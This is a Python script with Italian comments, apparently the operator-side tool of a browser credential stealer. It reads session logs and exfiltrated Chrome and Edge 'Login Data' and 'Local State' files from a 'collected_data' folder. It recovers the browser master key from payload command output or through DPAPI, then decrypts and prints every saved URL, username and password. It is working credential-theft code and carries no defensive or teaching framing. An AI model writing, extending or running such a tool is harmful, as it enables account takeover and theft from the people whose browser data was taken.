import os
import json
import base64
import sqlite3
import shutil
import re
from datetime import datetime, timedelta

# Aggiungi la cartella corrente al percorso di ricerca dei moduli
# Questo risolve il problema di importazione quando le librerie sono installate localmente
import sys
sys.path.append('.')

try:
    from Cryptodome.Cipher import AES
except ImportError:
    print("[ERRORE] Libreria 'pycryptodomex' non trovata. Per favore, installala con: pip install pycryptodomex")
    exit()

try:
    import win32crypt
except ImportError:
    print("[ERRORE] Libreria 'pypiwin32' non trovata. Per favore, installala con: pip install pypiwin32")
    exit()

def get_encryption_key_from_local_state(local_state_path):
    """Metodo di fallback: estrae la chiave di crittografia direttamente dal file Local State."""
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:] # Rimuovi il prefisso DPAPI
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def get_encryption_key_from_log(command_results, browser_name):
    """
    Metodo primario: cerca la chiave già estratta nei risultati dei comandi del file JSON.
    AGGIORNATO per leggere il formato del nuovo payload.
    """
    key_hex = None
    # Cerca il risultato del comando che ha estratto la chiave per il browser specifico
    for result in command_results:
        cmd_executed = result.get("command_executed", "")
        # Controlla se il comando è quello giusto per il browser corrente
        if browser_name in cmd_executed and "Get-BrowserMasterKey" in cmd_executed:
            output = result.get("output_decoded", "").strip()
            # L'output ora è solo la chiave esadecimale, senza prefissi
            if re.match(r'^[0-9A-Fa-f]{64}$', output):
                key_hex = output
                break # Trovata, esci dal ciclo
    
    if key_hex:
        # Converte la stringa esadecimale in bytes
        return bytes.fromhex(key_hex)
    return None

def decrypt_password(password, key):
    """Decritta la password usando la chiave AES."""
    try:
        iv = password[3:15]
        encrypted_part = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(encrypted_part)
        decrypted_pass = decrypted_pass[:-16].decode() # Rimuovi il tag di autenticazione
        return decrypted_pass
    except Exception:
        return ""

def main():
    print("--- DECRITTATORE DI CREDENZIALI BROWSER (PYTHON) V4 ---")
    
    base_path = os.getcwd()
    collected_data_path = os.path.join(base_path, "collected_data")
    files_path = os.path.join(collected_data_path, "files")

    if not os.path.exists(collected_data_path):
        print(f"[ERRORE] La cartella '{collected_data_path}' non è stata trovata.")
        print("[AZIONE] Assicurati che la cartella 'collected_data' sia nella stessa directory di questo script.")
        return

    # Scansiona per i file di sessione JSON
    for session_file in os.listdir(collected_data_path):
        if session_file.startswith("session_") and session_file.endswith(".json"):
            session_json_path = os.path.join(collected_data_path, session_file)
            print("=" * 60)
            print(f"[SESSIONE] Analizzo i dati dal file: {session_file}")

            with open(session_json_path, 'r', encoding='utf-8') as f:
                session_data = json.load(f)

            command_results = session_data.get("command_results", [])
            
            # Raggruppa i file per browser
            browser_files = {}
            for file_info in session_data.get("files", []):
                try:
                    browser_name = file_info["filename"].split('_')[0]
                    if browser_name not in browser_files:
                        browser_files[browser_name] = {}
                    
                    file_path = os.path.join(files_path, file_info["saved_as"])
                    
                    # Verifica se il file esiste prima di aggiungerlo
                    if not os.path.exists(file_path):
                        print(f"[AVVISO] File '{file_info['filename']}' ({file_info['saved_as']}) non trovato in '{files_path}'. Salto.")
                        continue
                    
                    if "LoginData" in file_info["filename"]:
                        browser_files[browser_name]["db"] = file_path
                    elif "LocalState" in file_info["filename"]:
                        browser_files[browser_name]["key_path"] = file_path
                except IndexError:
                    continue

            # Itera su ogni browser trovato per questa sessione
            for browser in ["Chrome", "Edge"]: # Processa in un ordine definito
                paths = browser_files.get(browser)
                if not paths:
                    continue
                
                print("-" * 50)
                print(f"[ANALISI] Sto processando i dati di: {browser}")

                key = get_encryption_key_from_log(command_results, browser)
                
                if key:
                    print(f"[SUCCESSO] Master Key per {browser} trovata nel log e caricata.")
                else:
                    print(f"[AVVISO] Chiave non trovata nel log per {browser}. Tento estrazione dal file 'Local State'...")
                    if "key_path" in paths:
                        try:
                            key = get_encryption_key_from_local_state(paths["key_path"])
                            print(f"[SUCCESSO] Master Key per {browser} estratta dal file Local State.")
                        except Exception as e:
                            print(f"[ERRORE] Impossibile estrarre la chiave di crittografia per {browser}. Dettagli: {e}")
                            continue
                    else:
                        print(f"[ERRORE] Impossibile trovare la chiave per {browser}. File 'Local State' non disponibile.")
                        continue
                
                # Decrittazione
                if "db" not in paths:
                    print(f"[INFO] Nessun file 'Login Data' trovato per {browser}. Salto.")
                    continue
                
                db_path = paths["db"]
                temp_db_filename = f"temp_db_{browser}.sqlite"
                shutil.copyfile(db_path, temp_db_filename)
                db = sqlite3.connect(temp_db_filename)
                cursor = db.cursor()

                try:
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    credenziali_trovate = 0
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row[0], row[1], row[2]
                        if username and encrypted_password:
                            password = decrypt_password(encrypted_password, key)
                            if password:
                                credenziali_trovate += 1
                                print(f"\n[+] URL: {url}")
                                print(f"    Username: {username}")
                                print(f"    Password: {password}")
                    if credenziali_trovate == 0:
                        print("[INFO] Nessuna credenziale trovata in questo database.")
                except Exception as e:
                    print(f"[ERRORE] Impossibile leggere il database per {browser}. Dettagli: {e}")
                finally:
                    cursor.close()
                    db.close()
                    os.remove(temp_db_filename)

if __name__ == "__main__":
    main()